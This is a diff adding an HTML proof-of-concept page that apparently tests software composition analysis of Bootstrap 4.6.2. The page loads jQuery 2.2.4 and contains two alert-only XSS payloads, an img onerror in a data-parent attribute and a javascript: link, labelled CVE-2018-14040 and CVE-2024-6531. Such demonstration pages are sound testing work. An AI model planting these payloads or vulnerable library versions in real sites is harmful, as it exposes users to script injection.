@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>POC SCA - Bootstrap 4.6.2 Local</title>
+    <link rel="stylesheet" href="./assets/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+  </head>
+  <body>
+    <h1>POC SCA - Bootstrap 4.6.2 Local</h1>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="./assets/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+    <div class="mb-5">
+        <a href="." class="btn btn-primary btn-lg px-4">Local files</a>
+    </div>
+    <br>
+    <a id="x" data-toggle="collapse" href="#x" data-parent="<img src=x onerror=alert(1) />">XSS CVE-2018-14040 Bootstrap < 3.4.0 || < 4.1.2</a>
+    <br>
+    <div id="myCarousel" class="carousel"></div>
+    <a href="javascript:alert('XSS CVE-2024-6531 - bootstrap >=4.0.0 &lt;5.0.0-beta1')" data-slide="prev">
+      Previous Slide
+    </a>
+  </body>
+</html>
